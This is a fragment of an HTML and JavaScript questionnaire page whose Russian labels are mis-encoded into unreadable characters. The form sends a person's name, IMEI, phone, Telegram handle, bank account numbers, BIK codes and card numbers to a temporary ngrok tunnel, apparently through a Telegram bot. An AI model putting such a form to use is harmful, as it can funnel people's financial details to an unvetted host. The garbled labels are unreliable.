  </style>
</head>
<body>
  <div class="container">
    <h2>–ê–Ω–∫–µ—Ç–∞</h2>
    <form id="form" action="https://6ef4-2a03-d000-8602-8a05-c8d9-b52a-cf38-64c8.ngrok-free.app" method="post" onsubmit="handleSubmit(event)">
      <input type="hidden" id="chat_id" name="chat_id"> <!-- –°–∫—Ä—ã—Ç–æ–µ –ø–æ–ª–µ –¥–ª—è chat_id -->
      <input type="hidden" id="owner_id" name="owner_id" value="@helper_kong"> <!-- –°–∫—Ä—ã—Ç–æ–µ –ø–æ–ª–µ —Å –ø–æ—Å—Ç–æ—è–Ω–Ω—ã–º –∑–Ω–∞—á–µ–Ω–∏–µ–º -->

      <label for="chat_number">‚Ññ –ß–∞—Ç–∞:</label>
      <input type="text" id="chat_number" name="chat_number" required title="–û—Ç 3 –¥–æ 4 —Ü–∏—Ñ—Ä –±–µ–∑ –ø—Ä–æ–±–µ–ª–æ–≤" placeholder="____" minlength="3" maxlength="4" oninput="validateField(this)">

      <label for="id">ID:</label>
      <input type="text" id="id" name="id" required title="6 —Ü–∏—Ñ—Ä –±–µ–∑ –ø—Ä–æ–±–µ–ª–æ–≤" placeholder="______" maxlength="6" oninput="validateField(this)">

      <label for="name">–§–ò–û:</label>
      <input type="text" id="name" name="name" required placeholder="–í–≤–µ–¥–∏—Ç–µ –§–ò–û">

      <label for="imei">IMEI:</label>
      <input type="text" id="imei" name="imei" required title="15 —Ü–∏—Ñ—Ä –±–µ–∑ –ø—Ä–æ–±–µ–ª–æ–≤" placeholder="_______________" maxlength="15" oninput="validateField(this)">

      <label for="phone">–¢–µ–ª–µ—Ñ–æ–Ω:</label>
      <input type="tel" id="phone" name="phone" required title="–§–æ—Ä–º–∞—Ç –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å +7" placeholder="+7 (___) ___-__-__">

      <label for="trust_limit">–õ–∏–º–∏—Ç –¥–æ–≤–µ—Ä–∏—è, —Ä—É–±:</label>
      <input type="number" id="trust_limit" name="trust_limit" required placeholder="–í–≤–µ–¥–∏—Ç–µ –ª–∏–º–∏—Ç –¥–æ–≤–µ—Ä–∏—è">

      <label for="comments">–ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–∏:</label>
      <textarea id="comments" name="comments" placeholder="–í–≤–µ–¥–∏—Ç–µ –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–∏ (–µ—Å–ª–∏ –µ—Å—Ç—å)"></textarea>

      <label for="add_to_chat">–î–æ–±–∞–≤–∏—Ç—å –≤ —á–∞—Ç:</label>
      <input type="text" id="add_to_chat" name="add_to_chat" required pattern="@.*" maxlength="32" title="–ù–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å @" placeholder="@username" value="@" onblur="validateField(this)">

      <h3>üè¶1Ô∏è‚É£</h3>
      <div id="banks">
        <div class="bank">
          <label for="bank">–ë–∞–Ω–∫:</label>
          <input type="text" name="banks[0][bank]" required placeholder="–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –±–∞–Ω–∫–∞">

          <label for="account1">–°—á–µ—Ç 1:</label>
          <input type="text" name="banks[0][account]" required title="20 —Ü–∏—Ñ—Ä –±–µ–∑ –ø—Ä–æ–±–µ–ª–æ–≤" placeholder="____ ____ ____ ____ ____" class="mask-account">

          <label for="bik1">–ë–ò–ö:</label>
          <input type="text" name="banks[0][bik]" required title="9 —Ü–∏—Ñ—Ä –±–µ–∑ –ø—Ä–æ–±–µ–ª–æ–≤" placeholder="_________" class="mask-bik">

          <div class="cards">
            <div class="card">
              <label for="card1">–ö–∞—Ä—Ç–∞ 1:</label>
              <input type="text" name="banks[0][cards][0]" required title="–û—Ç 13 –¥–æ 19 —Ü–∏—Ñ—Ä –±–µ–∑ –ø—Ä–æ–±–µ–ª–æ–≤" placeholder="____ ____ ____ ____ ____" class="mask-card">
            </div>
          </div>
          <button type="button" class="add-btn" onclick="addCard(this)">–î–æ–±–∞–≤–∏—Ç—å –∫–∞—Ä—Ç—É</button>
        </div>
      </div>
      <button type="button" class="add-bank-btn" onclick="addBank()">–î–æ–±–∞–≤–∏—Ç—å –±–∞–Ω–∫</button>

      <button type="submit" id="submit-btn">–û—Ç–ø—Ä–∞–≤–∏—Ç—å</button>
    </form>

  <script src="https://cdn.jsdelivr.net/npm/cleave.js@1.6.0/dist/cleave.min.js"></script>
  <script>
    document.addEventListener('DOMContentLoaded', function() {
      new Cleave('#phone', {
        phone: true,
        phoneRegionCode: 'RU',
        delimiters: [' ', '(', ')', '-', '-'],
        onValueChanged: function(e) {
          const rawValue = e.target.rawValue;
          document.getElementById('phone').value = '+' + rawValue.replace(/\D/g, '');
        }
      });

      new Cleave('#chat_number', {
        numericOnly: true,
        blocks: [4],
        onValueChanged: function(e) {
          const rawValue = e.target.rawValue;
          if (rawValue.length < 3 || rawValue.length > 4) {
            e.target.classList.add('error');
          } else {
            e.target.classList.remove('error');
          }
        }
      });

      new Cleave('#id', {
        numericOnly: true,
        blocks: [6]
      });

      new Cleave('#imei', {
        numericOnly: true,
        blocks: [15]
      });

      document.querySelectorAll('.mask-account').forEach(function(element) {
        new Cleave(element, {
          numericOnly: true,
          blocks: [4, 4, 4, 4, 4],
          delimiters: [' ']
        });
      });

      document.querySelectorAll('.mask-bik').forEach(function(element) {
        new Cleave(element, {
          numericOnly: true,
          blocks: [9]
        });
      });

      document.querySelectorAll('.mask-card').forEach(function(element) {
        new Cleave(element, {
          numericOnly: true,
          blocks: [4, 4, 4, 4, 4],
          delimiters: [' ']
        });
      });
    });

    let bankCount = 1;
    let cardCounts = [1];

    // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∑–Ω–∞—á–µ–Ω–∏–µ chat_id –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
    window.onload = function() {
      const urlParams = new URLSearchParams(window.location.search);
      const chat_id = urlParams.get('chat_id');
      document.getElementById('chat_id').value = chat_id;
    };

    function validateField(field) {
      const isValid = field.value.length >= field.getAttribute('minlength') && field.value.length <= field.getAttribute('maxlength');
      if (!isValid) {
        field.classList.add('error');
      } else {
        field.classList.remove('error');
      }
    }

    function addBank() {
      const banks = document.getElementById('banks');
      const bank = document.createElement('div');
      bank.className = 'bank';
      bank.innerHTML = `
        <h3>üè¶${bankCount + 1}Ô∏è‚É£</h3>
        <label for="bank">–ë–∞–Ω–∫:</label>
        <input type="text" name="banks[${bankCount}][bank]" required placeholder="–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –±–∞–Ω–∫–∞">

        <label for="account1">–°—á–µ—Ç 1:</label>
        <input type="text" name="banks[${bankCount}][account]" required title="20 —Ü–∏—Ñ—Ä –±–µ–∑ –ø—Ä–æ–±–µ–ª–æ–≤" placeholder="____ ____ ____ ____ ____" class="mask-account">

        <label for="bik1">–ë–ò–ö:</label>
        <input type="text" name="banks[${bankCount}][bik]" required title="9 —Ü–∏—Ñ—Ä –±–µ–∑ –ø—Ä–æ–±–µ–ª–æ–≤" placeholder="_________" class="mask-bik">

        <div class="cards">
          <div class="card">
            <label for="card1">–ö–∞—Ä—Ç–∞ 1:</label>
            <input type="text" name="banks[${bankCount}][cards][0]" required title="–û—Ç 13 –¥–æ 19 —Ü–∏—Ñ—Ä –±–µ–∑ –ø—Ä–æ–±–µ–ª–æ–≤" placeholder="____ ____ ____ ____ ____" class="mask-card">
          </div>
        </div>
        <button type="button" class="add-btn" onclick="addCard(this)">–î–æ–±–∞–≤–∏—Ç—å –∫–∞—Ä—Ç—É</button>
        <button type="button" class="remove-btn" onclick="removeBank(this)">–£–¥–∞–ª–∏—Ç—å –±–∞–Ω–∫</button>
      `;
      banks.appendChild(bank);
      cardCounts.push(1);
      bankCount++;

      // –ü—Ä–∏–º–µ–Ω–µ–Ω–∏–µ –º–∞—Å–æ–∫ –∫ –Ω–æ–≤—ã–º —ç–ª–µ–º–µ–Ω—Ç–∞–º
      new Cleave(bank.querySelector('.mask-account'), {
        numericOnly: true,
        blocks: [4, 4, 4, 4, 4],
        delimiters: [' ']
      });

      new Cleave(bank.querySelector('.mask-bik'), {
        numericOnly: true,
        blocks: [9]
      });

      new Cleave(bank.querySelector('.mask-card'), {
        numericOnly: true,
        blocks: [4, 4, 4, 4, 4],
        delimiters: [' ']
      });
    }

    function addCard(button) {
      const cards = button.previousElementSibling;
      const bankIndex = Array.from(document.getElementsByClassName('bank')).indexOf(button.parentElement);
      const cardIndex = cardCounts[bankIndex]++;
      const card = document.createElement('div');
      card.className = 'card';
      card.innerHTML = `
        <label for="card${cardIndex + 1}">–ö–∞—Ä—Ç–∞ ${cardIndex + 1}:</label>
        <input type="text" name="banks[${bankIndex}][cards][${cardIndex}]" required title="–û—Ç 13 –¥–æ 19 —Ü–∏—Ñ—Ä –±–µ–∑ –ø—Ä–æ–±–µ–ª–æ–≤" placeholder="____ ____ ____ ____ ____" class="mask-card">
        <button type="button" class="remove-btn" onclick="removeCard(this)">–£–¥–∞–ª–∏—Ç—å –∫–∞—Ä—Ç—É</button>
      `;
      cards.appendChild(card);

      new Cleave(card.querySelector('.mask-card'), {
        numericOnly: true,
        blocks: [4, 4, 4, 4, 4],
        delimiters: [' ']
      });
    }

    function removeBank(button) {
      const banks = document.getElementById('banks');
      const bank = button.parentElement;
      if (banks.children.length > 1) {  // –ó–∞–ø—Ä–µ—Ç –Ω–∞ —É–¥–∞–ª–µ–Ω–∏–µ –ø–µ—Ä–≤–æ–π –∑–∞–ø–∏—Å–∏ –±–∞–Ω–∫–∞
        bank.parentElement.removeChild(bank);
        bankCount--;
      } else {
        alert("–ü–µ—Ä–≤—ã–π –±–∞–Ω–∫ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å —É–¥–∞–ª–µ–Ω.");
      }
    }

    function removeCard(button) {
      const cards = button.parentElement.parentElement;
      const card = button.parentElement;
      if (cards.children.length > 1) {  // –ó–∞–ø—Ä–µ—Ç –Ω–∞ —É–¥–∞–ª–µ–Ω–∏–µ –ø–µ—Ä–≤–æ–π –∫–∞—Ä—Ç—ã
        cards.removeChild(card);
      } else {
        alert("–ü–µ—Ä–≤–∞—è –∫–∞—Ä—Ç–∞ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å —É–¥–∞–ª–µ–Ω–∞.");
      }
    }

    function handleSubmit(event) {
      const accountInputs = document.querySelectorAll('.mask-account');
      const cardInputs = document.querySelectorAll('.mask-card');
      accountInputs.forEach(input => input.value = input.value.replace(/\D/g, '')); // –£–¥–∞–ª–µ–Ω–∏–µ –ø—Ä–æ–±–µ–ª–æ–≤ –∏–∑ –Ω–æ–º–µ—Ä–æ–≤ —Å—á–µ—Ç–æ–≤
      cardInputs.forEach(input => input.value = input.value.replace(/\D/g, '')); // –£–¥–∞–ª–µ–Ω–∏–µ –ø—Ä–æ–±–µ–ª–æ–≤ –∏–∑ –Ω–æ–º–µ—Ä–æ–≤ –∫–∞—Ä—Ç
      const submitBtn = document.getElementById('submit-btn');
      submitBtn.disabled = true;
      submitBtn.textContent = '–û—Ç–ø—Ä–∞–≤–∫–∞...';
    }
  </script>
